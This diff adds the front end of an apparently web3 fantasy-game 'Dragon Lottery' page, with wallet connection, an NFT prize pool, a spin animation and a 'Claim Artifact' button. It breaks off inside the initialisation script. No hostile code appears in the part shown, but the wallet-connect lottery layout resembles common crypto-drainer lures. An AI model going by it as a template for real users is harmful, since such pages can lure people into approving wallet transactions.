@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Calamity Online - Dragon Lottery</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;700;900&family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        /* Design System / Tokens */
+        :root {
+            --bg-base: #0a0316;
+            --bg-panel: #140824;
+            --bg-card: #1f0f38;
+            --bg-card-hover: #261245;
+            
+            --border-subtle: rgba(139, 92, 246, 0.2);
+            --border-primary: rgba(139, 92, 246, 0.4);
+            --border-glow: #6b3fa0;
+            
+            --accent-purple-dim: #5b21b6;
+            --accent-purple: #8b5cf6;
+            --accent-purple-glow: #a78bfa;
+            
+            --accent-gold-dim: #b45309;
+            --accent-gold: #fbbf24;
+            --accent-gold-glow: #fde047;
+            
+            --text-primary: #ffffff;
+            --text-secondary: #a78bfa; /* Shifted to softer purple for themes */
+            --text-muted: #6b7280;
+
+            --tier-legendary: #fbbf24;
+            --tier-epic: #d946ef;
+            --tier-rare: #3b82f6;
+            --tier-common: #22c55e;
+            --tier-none: #4b5563;
+        }
+
+        /* Essential Reset and Base */
+        * { box-sizing: border-box; }
+        body { 
+            margin: 0; padding: 0; 
+            background-color: var(--bg-base); 
+            color: var(--text-primary); 
+            font-family: 'Nunito', sans-serif; 
+            min-height: 100vh;
+            display: flex;
+            overflow: hidden; /* Hide main scroll, handle in main-content */
+        }
+        
+        /* Premium Background with Noise & Lighting */
+        .app-background {
+            position: fixed; inset: 0; z-index: -1; pointer-events: none;
+            background: 
+                radial-gradient(circle at 10% 40%, rgba(139, 92, 246, 0.08) 0%, transparent 60%),
+                radial-gradient(circle at 90% 70%, rgba(251, 191, 36, 0.04) 0%, transparent 50%),
+                var(--bg-base);
+        }
+        .app-background::after {
+            content: ''; position: absolute; inset: 0;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)' opacity='0.03'/%3E%3C/svg%3E");
+            opacity: 0.6; mix-blend-mode: overlay;
+        }
+
+        h1, h2, h3, h4 { font-family: 'Cinzel', serif; margin: 0; font-weight: 700; letter-spacing: 0.5px; }
+        button { font-family: 'Nunito', sans-serif; cursor: pointer; border: none; outline: none; transition: all 0.2s cubic-bezier(0.2, 0.8, 0.2, 1); }
+
+        /* Typography Enhancements */
+        .gold-text-gradient {
+            background: linear-gradient(to bottom, #fde047 0%, #fbbf24 40%, #d97706 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 2px 10px rgba(251, 191, 36, 0.3);
+            filter: drop-shadow(0 2px 2px rgba(0,0,0,0.8));
+        }
+
+        /* Layout Grid */
+        .app-container { display: flex; width: 100%; height: 100vh; }
+
+        /* ======== SIDEBAR ======== */
+        .sidebar {
+            width: 260px;
+            background: linear-gradient(to right, var(--bg-panel) 0%, rgba(20, 8, 36, 0.9) 100%);
+            border-right: 1px solid var(--border-subtle);
+            box-shadow: 4px 0 24px rgba(0, 0, 0, 0.6);
+            display: flex; flex-direction: column;
+            z-index: 20; position: relative;
+        }
+        
+        /* Embossed dark inner line */
+        .sidebar::after {
+            content: ''; position: absolute; right: 0; top: 0; bottom: 0; width: 1px;
+            background: linear-gradient(to bottom, transparent, rgba(0,0,0,0.8), transparent);
+        }
+
+        .logo-area {
+            padding: 30px 24px;
+            display: flex; align-items: center; justify-content: center;
+        }
+
+        .logo-text {
+            font-weight: 900; font-size: 28px; text-transform: uppercase; letter-spacing: 2px;
+            background: linear-gradient(to bottom, #ffffff 0%, #d8b4fe 100%);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,1)) drop-shadow(0 0 10px rgba(139, 92, 246, 0.6));
+        }
+
+        .nav-menu { flex-grow: 1; padding: 10px 16px; display: flex; flex-direction: column; gap: 8px; overflow-y: auto; }
+        
+        .nav-item {
+            display: flex; align-items: center; gap: 16px; padding: 12px 16px;
+            border-radius: 8px; color: var(--text-secondary);
+            font-weight: 700; font-size: 15px; text-decoration: none;
+            position: relative; overflow: hidden;
+            border: 1px solid transparent;
+        }
+
+        .nav-item:hover { color: var(--text-primary); background: rgba(255,255,255,0.03); border-color: rgba(255,255,255,0.05); }
+        .nav-item.active {
+            color: var(--text-primary);
+            background: linear-gradient(90deg, rgba(139, 92, 246, 0.25) 0%, rgba(139, 92, 246, 0.05) 100%);
+            border: 1px solid var(--border-primary);
+            box-shadow: inset 2px 0 0 0 var(--accent-purple-glow), 0 4px 12px rgba(0,0,0,0.2);
+        }
+        
+        .nav-icon { font-size: 18px; filter: grayscale(0.8) opacity(0.7); }
+        .nav-item.active .nav-icon { filter: grayscale(0) opacity(1) drop-shadow(0 0 8px var(--accent-purple)); }
+        .nav-item:hover .nav-icon { filter: grayscale(0.3) opacity(0.9); }
+
+        /* ======== MAIN CONTENT ======== */
+        .main-content {
+            flex-grow: 1; display: flex; flex-direction: column; position: relative;
+            overflow-y: auto; overflow-x: hidden; scroll-behavior: smooth;
+        }
+
+        /* Decorative Stained Glass Backdrop */
+        .glass-backdrop {
+            position: fixed; top: 0; left: 260px; right: 0; bottom: 0; pointer-events: none; z-index: 0;
+            display: flex; justify-content: space-between; opacity: 0.15;
+            mask-image: linear-gradient(to bottom, black 0%, transparent 80%);
+            -webkit-mask-image: linear-gradient(to bottom, black 0%, transparent 80%);
+        }
+        .window-arch {
+            width: 300px; height: 600px; border-radius: 150px 150px 0 0;
+            border: 4px solid var(--accent-purple);
+            background: repeating-linear-gradient(45deg, transparent, transparent 20px, rgba(139,92,246,0.3) 20px, rgba(139,92,246,0.3) 22px);
+            margin: -50px 40px 0; box-shadow: 0 0 100px var(--accent-purple-dim);
+        }
+
+        /* HEADER */
+        .header {
+            display: flex; justify-content: flex-end; align-items: center; padding: 20px 40px;
+            position: sticky; top: 0; z-index: 15; gap: 16px;
+            background: linear-gradient(to bottom, rgba(10, 3, 22, 0.95) 0%, rgba(10, 3, 22, 0.8) 50%, transparent 100%);
+            border-bottom: 1px solid rgba(255,255,255,0.02);
+        }
+
+        .btn-outline {
+            background: rgba(31, 15, 56, 0.5); border: 1px solid var(--border-subtle);
+            color: var(--text-secondary); width: 44px; height: 44px; border-radius: 12px;
+            display: flex; align-items: center; justify-content: center; font-size: 18px;
+            box-shadow: inset 0 2px 4px rgba(255,255,255,0.05), 0 4px 8px rgba(0,0,0,0.4);
+        }
+        .btn-outline:hover { background: var(--bg-card); color: var(--text-primary); border-color: var(--border-primary); transform: translateY(-2px); }
+        
+        .btn-connect {
+            background: rgba(31, 15, 56, 0.5);
+            border: 1px solid var(--border-primary);
+            color: var(--text-primary); padding: 12px 28px; border-radius: 12px;
+            font-weight: 800; font-size: 15px; display: flex; align-items: center; gap: 10px;
+            box-shadow: inset 0 2px 4px rgba(255,255,255,0.05), 0 4px 15px rgba(0,0,0,0.5);
+        }
+        .btn-connect:hover {
+            background: var(--bg-card-hover); border-color: var(--accent-purple-glow);
+            box-shadow: inset 0 2px 4px rgba(255,255,255,0.1), 0 6px 20px rgba(139, 92, 246, 0.3);
+            transform: translateY(-2px);
+        }
+        .btn-connect.connected {
+            background: linear-gradient(180deg, #8b5cf6 0%, #6d28d9 100%);
+            border: 1px solid #a78bfa;
+            box-shadow: inset 0 2px 4px rgba(255,255,255,0.3), 0 6px 20px rgba(109, 40, 217, 0.6);
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+        }
+
+        /* PAGE CONTAINER */
+        .page-container {
+            max-width: 1000px; width: 100%; margin: 0 auto; padding: 10px 40px 80px;
+            display: flex; flex-direction: column; align-items: center; gap: 40px;
+            position: relative; z-index: 5;
+        }
+
+        /* CINEMATIC HERO BANNER */
+        .hero-banner {
+            width: 100%; padding: 60px 40px; text-align: center;
+            background: radial-gradient(ellipse at top, rgba(139,92,246,0.15) 0%, transparent 70%);
+            border-bottom: 1px solid var(--border-subtle);
+            position: relative;
+        }
+        .hero-banner::after {
+            content:''; position: absolute; bottom: -1px; left: 20%; right: 20%; height: 1px;
+            background: linear-gradient(90deg, transparent, var(--accent-gold), transparent);
+            opacity: 0.5;
+        }
+        
+        .hero-title {
+            font-size: 64px; margin-bottom: 16px; letter-spacing: 4px; text-transform: uppercase;
+        }
+        .hero-subtitle {
+            color: var(--text-secondary); font-size: 20px; font-weight: 600; max-width: 600px;
+            margin: 0 auto; line-height: 1.6; text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+        }
+
+        /* WALLET CARD (Premium Depth) */
+        .wallet-card {
+            width: 100%; max-width: 650px;
+            background: linear-gradient(180deg, var(--bg-card) 0%, rgba(20, 8, 36, 0.9) 100%);
+            border: 1px solid var(--border-subtle);
+            border-radius: 16px; padding: 6px; /* Outer frame padding */
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8), inset 0 2px 10px rgba(255,255,255,0.02);
+            position: relative; transition: all 0.4s;
+        }
+        .wallet-inner {
+            border: 2px dashed var(--border-primary); border-radius: 12px;
+            padding: 32px 24px; text-align: center;
+            display: flex; flex-direction: column; align-items: center; gap: 20px;
+            background: rgba(0,0,0,0.2);
+            box-shadow: inset 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .wallet-card.connected {
+            border-color: var(--accent-green);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8), 0 0 30px rgba(34, 197, 94, 0.1);
+        }
+        .wallet-card.connected .wallet-inner { border-style: solid; border-color: rgba(34, 197, 94, 0.3); background: rgba(34, 197, 94, 0.02); }
+        
+        .wallet-icon-large { font-size: 56px; filter: drop-shadow(0 8px 16px rgba(0,0,0,0.6)); margin-bottom: -10px; }
+        .wallet-label { color: var(--text-secondary); font-size: 15px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; }
+        
+        .wallet-address {
+            font-family: monospace; font-size: 20px; color: var(--text-primary); font-weight: 700;
+            background: rgba(0,0,0,0.6); padding: 12px 24px; border-radius: 8px; letter-spacing: 2px;
+            border: 1px solid rgba(255,255,255,0.05); box-shadow: inset 0 2px 8px rgba(0,0,0,1);
+            color: var(--accent-green); text-shadow: 0 0 10px rgba(34, 197, 94, 0.5);
+        }
+        
+        .loader {
+            width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.2);
+            border-radius: 50%; border-top-color: #fff; animation: spin 0.8s linear infinite; display: none;
+        }
+
+        /* PRIZE POOL */
+        .section-header {
+            width: 100%; border-bottom: 2px solid rgba(255,255,255,0.05);
+            padding-bottom: 16px; margin-bottom: 10px; display: flex; align-items: center; gap: 16px;
+        }
+        .section-header::before { content: '♦'; color: var(--accent-gold); font-size: 24px; }
+        .section-title { font-size: 28px; color: var(--text-primary); letter-spacing: 2px; }
+        
+        .prize-pool-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 20px; width: 100%; }
+        
+        .tier-card {
+            background: linear-gradient(180deg, rgba(31, 15, 56, 0.8) 0%, rgba(10, 3, 22, 0.9) 100%);
+            border: 1px solid var(--border-subtle);
+            border-radius: 12px;
+            display: flex; flex-direction: column; align-items: center;
+            position: relative; overflow: hidden;
+            transition: transform 0.3s cubic-bezier(0.2, 0.8, 0.2, 1), box-shadow 0.3s;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.5), inset 0 1px 1px rgba(255,255,255,0.05);
+        }
+        .tier-card:hover { 
+            transform: translateY(-8px); 
+            box-shadow: 0 15px 30px rgba(0,0,0,0.7), 0 0 20px rgba(var(--tier-rgb), 0.2), inset 0 1px 1px rgba(255,255,255,0.1);
+            border-color: rgba(var(--tier-rgb), 0.4);
+        }
+        
+        /* Glass Header for Card */
+        .tier-header {
+            width: 100%; padding: 8px; text-align: center;
+            background: rgba(var(--tier-rgb), 0.15);
+            border-bottom: 1px solid rgba(var(--tier-rgb), 0.3);
+            font-family: 'Cinzel', serif; font-size: 13px; font-weight: 800; text-transform: uppercase;
+            letter-spacing: 2px; color: var(--tier-color);
+            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+        }
+        
+        .tier-body { padding: 24px 16px; display: flex; flex-direction: column; align-items: center; width: 100%; }
+        .tier-icon { font-size: 48px; margin-bottom: 16px; filter: drop-shadow(0 8px 12px rgba(0,0,0,0.8)); }
+        .tier-name { font-weight: 800; font-size: 15px; text-align: center; margin-bottom: 12px; color: var(--text-primary); line-height: 1.3;}
+        .tier-chance { 
+            font-size: 13px; color: #fff; background: rgba(0,0,0,0.6); 
+            padding: 4px 12px; border-radius: 12px; font-weight: 700; 
+            border: 1px solid rgba(255,255,255,0.1); box-shadow: inset 0 2px 4px rgba(0,0,0,0.8);
+        }
+
+        /* MASSIVE SPIN BUTTON */
+        .action-area { display: flex; flex-direction: column; align-items: center; margin-top: 40px; width: 100%; position: relative; }
+        
+        .btn-massive-spin {
+            background: linear-gradient(180deg, #9333ea 0%, #6b21a8 100%);
+            border: 2px solid #c084fc;
+            color: white; border-radius: 60px;
+            font-size: 36px; font-family: 'Cinzel', serif; font-weight: 900;
+            padding: 28px 100px;
+            box-shadow: 
+                inset 0 4px 10px rgba(255,255,255,0.3), /* Top inner highlight */
+                inset 0 -6px 15px rgba(0,0,0,0.6),      /* Bottom inner shadow */
+                0 10px 20px rgba(0,0,0,0.8),            /* Standard drop */
+                0 0 30px rgba(147, 51, 234, 0.4);       /* Purple glow */
+            text-transform: uppercase; letter-spacing: 4px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.6), 0 0 10px rgba(255,255,255,0.3);
+            position: relative; overflow: hidden;
+            animation: idle-pulse 3s infinite alternate;
+        }
+        
+        @keyframes idle-pulse {
+            0% { box-shadow: inset 0 4px 10px rgba(255,255,255,0.3), inset 0 -6px 15px rgba(0,0,0,0.6), 0 10px 20px rgba(0,0,0,0.8), 0 0 20px rgba(147, 51, 234, 0.3); }
+            100% { box-shadow: inset 0 4px 10px rgba(255,255,255,0.3), inset 0 -6px 15px rgba(0,0,0,0.6), 0 10px 20px rgba(0,0,0,0.8), 0 0 50px rgba(147, 51, 234, 0.7); }
+        }
+
+        .btn-massive-spin::after {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: linear-gradient(45deg, transparent 40%, rgba(255,255,255,0.4) 50%, transparent 60%);
+            transform: translateX(-100%); transition: transform 0.6s ease;
+        }
+        
+        .btn-massive-spin:hover:not(:disabled) {
+            transform: translateY(-4px) scale(1.03); filter: brightness(1.1);
+        }
+        .btn-massive-spin:hover:not(:disabled)::after { transform: translateX(100%); }
+        .btn-massive-spin:active:not(:disabled) { transform: translateY(4px) scale(0.97); filter: brightness(0.9); box-shadow: inset 0 8px 20px rgba(0,0,0,0.8), 0 2px 5px rgba(0,0,0,0.8); }
+        .btn-massive-spin:disabled { 
+            background: #374151; border-color: #4b5563; color: #9ca3af; box-shadow: inset 0 -4px 10px rgba(0,0,0,0.4); 
+            cursor: not-allowed; animation: none; opacity: 0.9; text-shadow: none;
+        }
+        
+        .spin-warning { 
+            position: absolute; bottom: -40px; color: var(--accent-red); font-size: 16px; font-weight: 700; 
+            background: rgba(0,0,0,0.8); padding: 8px 16px; border-radius: 8px; border: 1px solid rgba(239, 68, 68, 0.3);
+            opacity: 0; transition: all 0.3s; transform: translateY(10px); 
+        }
+        .spin-warning.visible { opacity: 1; transform: translateY(0); }
+
+        /* ======== LOTTERY ANIMATION SUPER-PHASES ======== */
+        .lottery-modal {
+            position: fixed; inset: 0; z-index: 1000;
+            background: rgba(10, 3, 22, 0.92); backdrop-filter: blur(12px);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            opacity: 0; pointer-events: none; transition: opacity 0.5s ease;
+        }
+        .lottery-modal.active { opacity: 1; pointer-events: all; }
+
+        /* PHASE 1: Magic Buildup */
+        .buildup-container { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; opacity: 0; pointer-events: none; }
+        .lottery-modal[data-phase="1"] .buildup-container { opacity: 1; z-index: 10; animation: fade-in 0.3s forwards; }
+        
+        .runic-circle {
+            position: absolute; width: 400px; height: 400px; border-radius: 50%;
+            border: 2px dashed rgba(139, 92, 246, 0.3);
+            animation: spin 10s linear infinite;
+        }
+        .chest-orb {
+            width: 140px; height: 140px; border-radius: 50%;
+            background: radial-gradient(circle at 30% 30%, #fde047, #d946ef, #6d28d9, #1e1b4b);
+            box-shadow: 0 0 80px #a855f7, inset 0 0 40px rgba(255,255,255,0.8);
+            animation: orb-pulse-intense 1.5s cubic-bezier(0.4, 0, 0.2, 1) infinite alternate, shake-small 0.05s infinite;
+            border: 4px solid #fff;
+        }
+        
+        /* PHASE 2: Epic Slot Reel Design */
+        .reel-container {
+            position: absolute; width: 360px; height: 480px;
+            background: linear-gradient(180deg, #111 0%, #222 50%, #111 100%);
+            border: 8px solid #2d2f33; border-radius: 20px;
+            box-shadow: 
+                0 40px 100px rgba(0,0,0,0.9), 
+                inset 0 0 60px rgba(0,0,0,1),
+                0 0 0 2px var(--accent-gold),
+                0 0 40px rgba(251, 191, 36, 0.3);
+            overflow: hidden; display: flex; justify-content: center;
+            opacity: 0; transform: scale(0.7) translateY(50px); pointer-events: none;
+        }
+        .lottery-modal[data-phase="2"] .reel-container { 
+            opacity: 1; transform: scale(1) translateY(0);
+            animation: cinematic-pop 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; z-index: 10;
+        }
+        
+        .reel-overlay {
+            position: absolute; inset: 0; z-index: 5; pointer-events: none;
+            background: linear-gradient(to bottom, 
+                rgba(0,0,0,0.9) 0%, rgba(0,0,0,0.2) 20%, 
+                transparent 45%, transparent 55%, 
+                rgba(0,0,0,0.2) 80%, rgba(0,0,0,0.9) 100%);
+            box-shadow: inset 0 0 30px rgba(0,0,0,0.8);
+        }
+        .reel-target-box {
+            position: absolute; top: 50%; left: 0; right: 0; height: 160px; margin-top: -80px;
+            border: 3px solid rgba(251, 191, 36, 0.8); border-left: none; border-right: none;
+            background: linear-gradient(90deg, transparent, rgba(251, 191, 36, 0.1), transparent);
+            z-index: 4; box-shadow: inset 0 0 20px rgba(251, 191, 36, 0.2), 0 0 20px rgba(251, 191, 36, 0.4);
+        }
+        
+        .reel { display: flex; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; will-change: transform; }
+        .reel-slot { width: 100%; height: 160px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 8px; }
+        .reel-icon { font-size: 72px; filter: drop-shadow(0 10px 15px rgba(0,0,0,0.8)); margin-bottom: 4px; }
+        .reel-name { font-family: 'Cinzel', serif; font-size: 26px; font-weight: 900; text-shadow: 0 4px 8px rgba(0,0,0,1); text-align: center; line-height: 1;}
+
+        /* PHASE 3: Blinding Result */
+        .result-flash {
+            position: absolute; inset: 0; background: #fff; z-index: 99; opacity: 0; pointer-events: none;
+        }
+        .lottery-modal[data-phase="3"] .result-flash { animation: flash-bang 1s cubic-bezier(0.1, 0.8, 0.2, 1) forwards; }
+        
+        .result-view {
+            position: absolute; inset: 0; z-index: 20; padding: 20px;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 40px;
+            opacity: 0; pointer-events: none; 
+        }
+        .lottery-modal[data-phase="3"] .result-view { opacity: 1; pointer-events: all; animation: fade-in 0.5s 0.3s forwards; }
+        
+        .result-headtext { font-size: 80px; text-transform: uppercase; margin: 0; opacity: 0; letter-spacing: 4px; }
+        .lottery-modal[data-phase="3"] .result-headtext { animation: result-stamp 0.8s 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
+        
+        .result-card {
+            background: linear-gradient(180deg, rgba(31, 15, 56, 0.6) 0%, rgba(10, 3, 22, 0.8) 100%);
+            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+            border: 2px solid var(--border-subtle); border-radius: 24px; padding: 60px 80px;
+            display: flex; flex-direction: column; align-items: center; gap: 20px;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.8), inset 0 2px 20px rgba(255,255,255,0.05);
+            opacity: 0; transform: translateY(60px) scale(0.9);
+        }
+        .lottery-modal[data-phase="3"] .result-card { animation: result-card-up 0.7s 0.4s forwards cubic-bezier(0.2, 0.8, 0.2, 1); }
+        
+        .res-icon { font-size: 160px; filter: drop-shadow(0 20px 30px rgba(0,0,0,0.8)); animation: float-large 4s ease-in-out infinite; margin-bottom: 10px; }
+        .res-tier { font-family: 'Cinzel', serif; font-size: 24px; text-transform: uppercase; letter-spacing: 6px; font-weight: 900; }
+        .res-name { font-size: 40px; font-weight: 800; color: white; text-shadow: 0 4px 10px rgba(0,0,0,0.8); }
+        
+        .result-actions { display: flex; gap: 24px; opacity: 0; }
+        .lottery-modal[data-phase="3"] .result-actions { animation: fade-in 0.5s 1.2s forwards; }
+        
+        .btn-action { padding: 18px 40px; border-radius: 12px; font-weight: 800; font-size: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.4); text-transform: uppercase; letter-spacing: 1px;}
+        .btn-primary { background: linear-gradient(180deg, #22c55e 0%, #15803d 100%); border: 1px solid #4ade80; color: white; }
+        .btn-primary:hover { transform: translateY(-4px); box-shadow: 0 15px 30px rgba(34, 197, 94, 0.4); filter: brightness(1.1); }
+        .btn-secondary { background: rgba(0,0,0,0.5); border: 2px solid var(--text-secondary); color: white; }
+        .btn-secondary:hover { background: rgba(139, 92, 246, 0.3); border-color: white; transform: translateY(-4px); }
+
+        /* WIN / LOSE THEMES */
+        .result-view.win .result-headtext { color: var(--accent-gold); text-shadow: 0 0 40px rgba(251,191,36,0.6), 0 4px 15px #000; }
+        .result-view.win .result-card { border: 2px solid var(--accent-gold); box-shadow: 0 0 100px rgba(251,191,36,0.25), inset 0 0 40px rgba(251,191,36,0.1), 0 40px 100px rgba(0,0,0,0.9); }
+        .result-view.win::before { content: ''; position: absolute; inset: 0; background: radial-gradient(circle, rgba(251,191,36,0.1) 0%, transparent 60%); z-index: -1; }
+        
+        .result-view.lose .result-headtext { color: #9ca3af; text-shadow: 0 4px 15px #000; font-size: 64px; }
+        .result-view.lose .result-card { border-color: #374151; box-shadow: 0 20px 50px rgba(0,0,0,0.8); background: rgba(17, 24, 39, 0.8); }
+        .result-view.lose .res-icon { filter: grayscale(1) drop-shadow(0 10px 15px rgba(0,0,0,0.8)); animation: none; }
+        
+        #particles-container, #confetti-container { position: absolute; inset: 0; pointer-events: none; z-index: 100; overflow: hidden; }
+
+        /* General Keyframes */
+        @keyframes fade-in { 0% { opacity: 0; } 100% { opacity: 1; } }
+        @keyframes cinematic-pop { 0% { opacity: 0; transform: scale(0.6) translateY(50px); filter: blur(10px); } 100% { opacity: 1; transform: scale(1) translateY(0); filter: blur(0); } }
+        @keyframes flash-bang { 0% { opacity: 1; } 100% { opacity: 0; } }
+        @keyframes orb-pulse-intense { 0% { transform: scale(0.8); box-shadow: 0 0 40px var(--accent-purple); } 100% { transform: scale(1.2); box-shadow: 0 0 120px var(--accent-gold), 0 0 40px #fff; } }
+        
+        /* Media Queries for Responsive Design */
+        @media (max-width: 900px) {
+            .app-container { flex-direction: column; }
+            .sidebar { width: 100%; height: auto; flex-direction: row; align-items: center; justify-content: space-between; padding: 12px 16px; border-right: none; border-bottom: 1px solid var(--border-subtle); box-shadow: 0 4px 10px rgba(0,0,0,0.5);}
+            .logo-area { padding: 0; margin: 0; }
+            .logo-text { font-size: 20px; }
+            .nav-menu { flex-direction: row; padding: 0; overflow-x: auto; gap: 4px;}
+            .nav-item { padding: 8px; border-radius: 8px; }
+            .nav-item span:not(.nav-icon) { display: none; }
+            
+            .glass-backdrop { display: none; }
+            .header { padding: 16px; justify-content: center; background: var(--bg-card); }
+            .btn-outline { display: none; }
+            
+            .page-container { padding: 20px 16px; }
+            .hero-banner { padding: 30px 20px; }
+            .hero-title { font-size: 40px; }
+            .prize-pool-grid { grid-template-columns: repeat(2, 1fr); }
+            .btn-massive-spin { width: 100%; font-size: 26px; padding: 24px 20px; border-radius: 20px; }
+            
+            .result-card { padding: 30px 20px; width: 90%; }
+            .res-icon { font-size: 100px; }
+            .result-headtext { font-size: 48px; }
+            .result-actions { flex-direction: column; width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="app-background"></div>
+
+    <div class="app-container">
+        <!-- SIDEBAR -->
+        <aside class="sidebar">
+            <div class="logo-area">
+                <span class="logo-text">Calamity</span>
+            </div>
+            <nav class="nav-menu">
+                <a href="#" class="nav-item"><span class="nav-icon">📊</span> <span>Overview</span></a>
+                <a href="#" class="nav-item"><span class="nav-icon">💰</span> <span>Buy Gold</span></a>
+                <a href="#" class="nav-item"><span class="nav-icon">🔮</span> <span>Artifacts Migration</span></a>
+                <a href="#" class="nav-item"><span class="nav-icon">🔗</span> <span>Link Account</span></a>
+                <a href="#" class="nav-item"><span class="nav-icon">✨</span> <span>Mint Cosmetics</span></a>
+                <a href="#" class="nav-item"><span class="nav-icon">👛</span> <span>Wallet Checker</span></a>
+                <a href="#" class="nav-item"><span class="nav-icon">📚</span> <span>Wiki</span></a>
+                <a href="#" class="nav-item"><span class="nav-icon">⚔️</span> <span>Armory</span></a>
+                <a href="#" class="nav-item active"><span class="nav-icon">🎲</span> <span>Dragon Lottery</span></a>
+            </nav>
+        </aside>
+
+        <!-- MAIN -->
+        <main class="main-content">
+            <div class="glass-backdrop">
+                <div class="window-arch"></div>
+                <div class="window-arch"></div>
+            </div>
+            
+            <!-- HEADER -->
+            <header class="header">
+                <button class="btn-outline">🛡️</button>
+                <button class="btn-outline">⚙️</button>
+                <button class="btn-connect" id="header-connect-btn">Connect Wallet</button>
+            </header>
+
+            <div class="page-container">
+                <!-- HERO -->
+                <div class="hero-banner">
+                    <h1 class="hero-title gold-text-gradient">Dragon Lottery</h1>
+                    <p class="hero-subtitle">Test your luck to win legendary artifacts, massive gold piles, and exclusive seasonal cosmetics.</p>
+                </div>
+
+                <!-- WALLET CARD -->
+                <div class="wallet-card" id="wallet-card">
+                    <div class="wallet-inner">
+                        <div class="wallet-icon-large">🧝</div>
+                        <div class="wallet-label">Account Link Required</div>
+                        <button class="btn-connect" id="main-connect-btn">
+                            <span>Connect Wallet</span>
+                            <div class="loader" id="connect-loader"></div>
+                        </button>
+                        <div id="wallet-address-display" style="display: none;" class="wallet-address"></div>
+                    </div>
+                </div>
+
+                <!-- PRIZE POOL -->
+                <div style="width: 100%; z-index: 10;">
+                    <div class="section-header">
+                        <h2 class="section-title">Current Prize Pool</h2>
+                    </div>
+                    <div class="prize-pool-grid" id="prize-pool-container"></div>
+                </div>
+
+                <!-- ACTION -->
+                <div class="action-area">
+                    <button class="btn-massive-spin" id="btn-spin" disabled>SPIN PORTAL</button>
+                    <div class="spin-warning" id="spin-warning">Connect your wallet to spin!</div>
+                </div>
+            </div>
+        </main>
+
+        <!-- LOTTERY OVERLAY -->
+        <div class="lottery-modal" id="lottery-modal" data-phase="0">
+            <div id="particles-container"></div>
+            <div id="confetti-container"></div>
+            <div class="result-flash"></div>
+
+            <!-- PHASE 1 -->
+            <div class="buildup-container">
+                <div class="runic-circle"></div>
+                <div class="chest-orb"></div>
+            </div>
+
+            <!-- PHASE 2 -->
+            <div class="reel-container">
+                <div class="reel-overlay"></div>
+                <div class="reel-target-box"></div>
+                <div class="reel" id="slot-reel"></div>
+            </div>
+
+            <!-- PHASE 3 -->
+            <div class="result-view" id="result-view">
+                <h1 class="result-headtext gold-text-gradient" id="result-headtext">YOU WON!</h1>
+                <div class="result-card" id="result-card">
+                    <div class="res-icon" id="res-icon">💍</div>
+                    <div class="res-tier" id="res-tier">Legendary</div>
+                    <div class="res-name" id="res-name">Dragon Ring NFT</div>
+                </div>
+                <div class="result-actions">
+                    <button class="btn-action btn-secondary" id="btn-spin-again">Spin Again</button>
+                    <button class="btn-action btn-primary" id="btn-claim" style="display: none;">Claim Artifact</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- LOGIC -->
+    <script>
+        const prizes = [
+            { id: 0, tier: 'Legendary', name: 'Dragon Ring', rarity: 1, color: '#fbbf24', rgb: '251,191,36', icon: '💍', win: true },
+            { id: 1, tier: 'Epic', name: '500 Gold', rarity: 5, color: '#d946ef', rgb: '217,70,239', icon: '💰', win: true },
+            { id: 2, tier: 'Rare', name: '100 Gold', rarity: 15, color: '#3b82f6', rgb: '59,130,246', icon: '🪙', win: true },
+            { id: 3, tier: 'Common', name: '20 Gold', rarity: 40, color: '#22c55e', rgb: '34,197,94', icon: '🪙', win: true },
+            { id: 4, tier: 'None', name: 'Dust', rarity: 39, color: '#9ca3af', rgb: '156,163,175', icon: '🕸️', win: false }
+        ];
+
+        let walletConnected = false, isSpinning = false;
+        
+        const doc = (id) => document.getElementById(id);
+        const prizePool = doc('prize-pool-container'), headerBtn = doc('header-connect-btn'), mainBtn = doc('main-connect-btn');
+        const spinBtn = doc('btn-spin'), modal = doc('lottery-modal'), reel = doc('slot-reel');
+
+        function init() {
+            prizePool.innerHTML = prizes.map(p => `
+                <div class="tier-card" style="--tier-color: ${p.color}; --tier-rgb: ${p.rgb}">
+                    <div class="tier-header">${p.tier}</div>
+                    <div class="tier-body">
+                        <div class="tier-icon">${p.icon}</div>
+                        <div class="tier-name">${p.name}</div>
+                        <div class="tier-chance">${p.rarity}% Drop</div>
+                    </div>
+                </div>`).join('');
+            
